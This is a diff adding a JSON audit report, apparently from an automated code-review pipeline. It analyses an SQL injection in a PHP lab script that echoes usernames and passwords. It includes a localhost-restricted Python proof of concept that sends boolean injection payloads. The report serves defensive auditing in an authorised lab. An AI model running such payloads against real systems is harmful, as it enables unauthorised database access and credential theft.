@@ -1,0 +1,125 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "单一输入包内已具备完整静态链路：第8行直接读取 $_GET['id'] 且无过滤，第14行以字符串插值把该值放入单引号值位置，第15行立即 mysql_query 执行，第16-24行回显查询结果；片段内不存在参数化、转义或白名单。缺口仅在未提供的连接文件与运行配置，属部署条件而非路径本身。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        }
+      ],
+      "data_flow": [
+        "第6行 if(isset($_GET['id'])) 决定入口：仅当 GET 参数 id 存在时进入处理分支。",
+        "第8行 $id=$_GET['id']; 把请求参数原样赋给 $id，片段内未见 trim、类型转换、addslashes、mysql_real_escape_string 或其他过滤。",
+        "第10-12行把 $id 直接写入 result.txt 追加日志，仅作记录，不改变变量内容。",
+        "第14行在双引号字符串中插值 $id，形成 SELECT * FROM users WHERE id='$id' LIMIT 0,1：$id 落在单引号包裹的值位置，可闭合引号后追加 SQL 片段。",
+        "第15行 mysql_query($sql) 将拼接结果送入数据库执行，无参数化、无预处理绑定、无白名单约束。",
+        "第16-24行 mysql_fetch_array 取出首行并回显 username 与 password；第26-29行失败分支 print_r(mysql_error()) 输出错误信息。"
+      ],
+      "principle": "用户可控的 GET 参数 id 未经转义或参数化即被插入单引号字符串值位置，再交由 mysql_query 执行。单引号可闭合原值边界并向 WHERE 子句注入布尔表达式、注释符或 UNION 分支，使查询语义由输入决定，而不仅是查询固定主键。",
+      "impact": "可读取 users 表任意行乃至同库其他表的数据；页面直接回显 username 与 password，凭据泄露风险高；亦可用于布尔盲注逐位推断数据。LIMIT 0,1 只限制单次返回行数，不构成防护。",
+      "preconditions": [
+        "运行环境提供 mysql_* 扩展（PHP 5.x 或兼容层），否则第15行无法执行，注入路径不可达。",
+        "include(\"../sql-connections/sql-connect.php\") 能成功连接 security 数据库且存在 users 表。",
+        "脚本可经 HTTP 访问，且入口未被前置 WAF、全局过滤或框架中间件改写 $_GET。",
+        "请求携带名为 id 的 GET 参数并进入 isset 分支；片段未限制取值必须为数字。"
+      ],
+      "counterexamples": [
+        "若连接文件或公共前置代码对 $_GET 统一执行 addslashes / mysql_real_escape_string 且字符集与连接一致，单引号被转义，本片段路径被阻断（当前片段未显示此类处理）。",
+        "若入口改为 intval((int)$_GET['id']) 等强制数值化，或改用预处理绑定参数，则值位置不可注入。",
+        "若部署层 WAF 拦截引号、注释符或布尔表达式，请求可能被拒绝，但这属于外部缓解而非代码修复。",
+        "若运行环境已移除 mysql_* 扩展，脚本在 error_reporting(0) 下不产生可见输出，查询不会执行，注入不可达。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "Python",
+        "code": "#!/usr/bin/env python3\n# SQLI-001 POC draft: boolean differential on the GET parameter \"id\".\n# Local authorized lab only. Three GET requests; no enumeration, no UNION\n# extraction, no writes; redirects are never followed.\nimport argparse\nimport hashlib\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nLOGIN_MARKER = \"Your Login name:\"\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef validate(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in (\"http\", \"https\"):\n        sys.exit(\"[!] unsupported scheme: %r (http/https only)\" % parts.scheme)\n    host = (parts.hostname or \"\").lower()\n    if host not in ALLOWED_HOSTS:\n        sys.exit(\"[!] host %r is not local; allowed: %s\" % (host, sorted(ALLOWED_HOSTS)))\n\n\ndef request(url, timeout, cookie):\n    validate(url)\n    req = urllib.request.Request(url, method=\"GET\")\n    req.add_header(\"User-Agent\", \"sqli-001-static-poc/1.0\")\n    if cookie:\n        req.add_header(\"Cookie\", cookie)\n    opener = urllib.request.build_opener(NoRedirect())\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            raw = resp.read(200000)\n            return resp.status, raw.decode(\"utf-8\", \"replace\")\n    except urllib.error.HTTPError as exc:\n        raw = exc.read(200000)\n        return exc.code, raw.decode(\"utf-8\", \"replace\")\n    except urllib.error.URLError as exc:\n        sys.exit(\"[!] connection failed: %s\" % exc.reason)\n    except TimeoutError:\n        sys.exit(\"[!] timeout after %ss\" % timeout)\n\n\ndef probe(base, path, param, value, timeout, cookie):\n    query = urllib.parse.urlencode({param: value})\n    url = \"%s%s%s%s\" % (base.rstrip(\"/\"), path, \"&\" if \"?\" in path else \"?\", query)\n    print(\"[*] GET %s (param %s = %r)\" % (path, param, value))\n    status, body = request(url, timeout, cookie)\n    digest = hashlib.sha256(body.encode(\"utf-8\", \"replace\")).hexdigest()[:16]\n    print(\"    status=%s len=%d sha256=%s marker=%s\"\n          % (status, len(body), digest, LOGIN_MARKER in body))\n    return status, body, LOGIN_MARKER in body\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"SQLI-001 local boolean differential (draft)\")\n    ap.add_argument(\"--base-url\", required=True, help=\"e.g. http://127.0.0.1:8080\")\n    ap.add_argument(\"--path\", required=True,\n                    help=\"request path of the audited script, e.g. /sqli/lesson-1/index.php\")\n    ap.add_argument(\"--param\", default=\"id\", help=\"GET parameter name taken from the code (default: id)\")\n    ap.add_argument(\"--baseline\", default=\"1\", help=\"normal value (default: 1)\")\n    ap.add_argument(\"--timeout\", type=float, default=10.0)\n    ap.add_argument(\"--session-file\", default=None,\n                    help=\"optional local file holding a Cookie header; never committed\")\n    args = ap.parse_args()\n\n    if not args.path.startswith(\"/\"):\n        sys.exit(\"[!] --path must start with '/'\")\n\n    cookie = None\n    if args.session_file:\n        try:\n            with open(args.session_file, \"r\", encoding=\"utf-8\") as fh:\n                cookie = fh.read().strip() or None\n        except OSError as exc:\n            sys.exit(\"[!] cannot read session file: %s\" % exc)\n\n    true_payload = args.baseline + \"' AND '1'='1\"\n    false_payload = args.baseline + \"' AND '1'='2\"\n\n    status, body, marker = probe(args.base_url, args.path, args.param,\n                                 args.baseline, args.timeout, cookie)\n    if 300 <= status < 400:\n        sys.exit(\"[!] redirect (status %s): authentication/session not established, stop\" % status)\n    if not marker:\n        sys.exit(\"[!] baseline lacks %r: wrong path/param or unauthenticated; adapt manually\"\n                 % LOGIN_MARKER)\n\n    s1, b1, m1 = probe(args.base_url, args.path, args.param, true_payload, args.timeout, cookie)\n    s2, b2, m2 = probe(args.base_url, args.path, args.param, false_payload, args.timeout, cookie)\n\n    print(\"\")\n    print(\"[=] true-branch  marker=%s (expected True: query still selects the row)\" % m1)\n    print(\"[=] false-branch marker=%s (expected False if the quote escaped the string)\" % m2)\n    if s1 == 200 and s2 == 200 and m1 and not m2:\n        print(\"[+] differential observed: the parameter changes a WHERE truth value\")\n        print(\"[!] one local observation is not full proof; keep the raw requests and responses\")\n        return 0\n    print(\"[-] no clean differential: possible escaping/filtering, another SQL shape, or auth change\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+",
+          "仅标准库：argparse、hashlib、sys、urllib.error、urllib.parse、urllib.request",
+          "目标侧：可访问的本地授权靶场实例，PHP 环境具备 mysql_* 兼容支持，security 库 users 表存在"
+        ],
+        "parameters": [
+          "--base-url：本地基址，仅接受 http/https 且主机为 localhost、127.0.0.1 或 ::1",
+          "--path：被审计脚本的实际请求路径，片段未给出，必须人工填写",
+          "--param：GET 参数名，默认 id（来自第6、8行代码）",
+          "--baseline：正常输入值，默认 1（需与 users 表实际存在的 id 对应）",
+          "--timeout：请求超时秒数，默认 10",
+          "--session-file：可选本地文件，存放 Cookie 请求头；不写入版本库、不打印"
+        ],
+        "steps": [
+          "在本地授权靶场部署该脚本及其连接文件，确认 GET /<path>?id=1 返回 Your Login name: 行。",
+          "执行：python3 sqli001_poc.py --base-url http://127.0.0.1:8080 --path /<实际路径> --param id --baseline 1",
+          "观察基线请求是否返回 200 且响应含 Your Login name:；若为 3xx 跳转或缺少标记，先修正路径、登录态或 id 值，不继续判定。",
+          "脚本自动追加两条测试输入：1' AND '1'='1 与 1' AND '1'='2（URL 编码后发送），并比较标记出现情况。",
+          "保存三条原始请求与响应（含状态码、长度、sha256），作为工作包4的运行记录；本草案未运行。"
+        ],
+        "expected_observation": "基线 id=1 返回含 Your Login name: 的页面；1' AND '1'='1 因 WHERE 恒真仍返回同一行；1' AND '1'='2 因恒假不返回行，页面缺失 Your Login name: 标记。三者在仅参数值不同的条件下出现稳定差异。",
+        "success_criteria": "在路径与登录态正确、基线可复现的前提下，恒真输入保留行输出而恒假输入丢失行输出，且该差异可重复、可由响应字节对照（长度或 sha256）佐证。若两条测试输入均与基线一致，则提示引号被转义或被过滤；若均异常，需先排除语法错误与认证跳转，不能据此认定安全。",
+        "limitations": [
+          "片段不可独立部署，连接实现、字符集与转义配置位于未提供的 context/sqli-connect.php，需人工确认。",
+          "未提供 PHP、MySQL 版本与部署配置，mysql_* 兼容性、magic_quotes 遗留行为未知。",
+          "草案仅做布尔差分，不枚举数据库、不使用 UNION 取数、不写库；因此不能量化可读取范围。",
+          "error_reporting(0) 会隐藏 SQL 语法错误，空白响应既可能是查询失败也可能是页面结构差异，需以恒真/恒假对照区分。",
+          "脚本中的 --path 与 users 表实际 id 需人工适配，未提供时无法直接运行。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php 或 sql-connections/sql-connect.php 的连接实现：字符集设置、是否全局转义、错误处理方式。",
+    "db-creds.inc 与 security 库 users 表的实际结构与初始数据，用于确认基线 id 存在。",
+    "PHP 与 MySQL/MariaDB 版本，决定 mysql_* 扩展是否可用及 SQL 模式。",
+    "Web 服务器部署路径与访问控制，确认脚本可被 HTTP 直接请求且无前置认证。",
+    "是否存在 WAF、反向代理或框架层对 GET 参数的统一过滤。"
+  ],
+  "risk_notes": [
+    "第26-29行在查询失败时 print_r(mysql_error())，可能泄露库名、表名与 SQL 结构，属信息泄露风险。",
+    "第10-12行把原始 id 值追加写入 result.txt，存在日志注入与敏感输入落盘风险。",
+    "第20-22行回显 username 与 password 未做 HTML 转义，若库中值可控则存在存储型 XSS 风险（超出本次 SQL 注入范围）。"
+  ],
+  "quality_notes": [
+    "使用已过时的 mysql_* 接口，在 PHP 7+ 已移除，需要兼容层才能运行。",
+    "error_reporting(0) 抑制错误，掩盖故障，增加排查与验证难度。",
+    "日志文件 result.txt 写在相对路径，可能位于 Web 可访问目录。"
+  ],
+  "limitations": [
+    "仅一个输入包，未收到其他分片，analysis_stage=parent 基于清单中已列全部包（1/1）。",
+    "判定为静态分析，未执行任何请求，verdict 保持待验证，未使用确认。",
+    "行号为标准化代码块内 1 起始行号，非原始文件行号。",
+    "未评估注入可读取的数据范围与具体数据库权限，需实际环境验证。"
+  ],
+  "runtime_evidence": []
+}
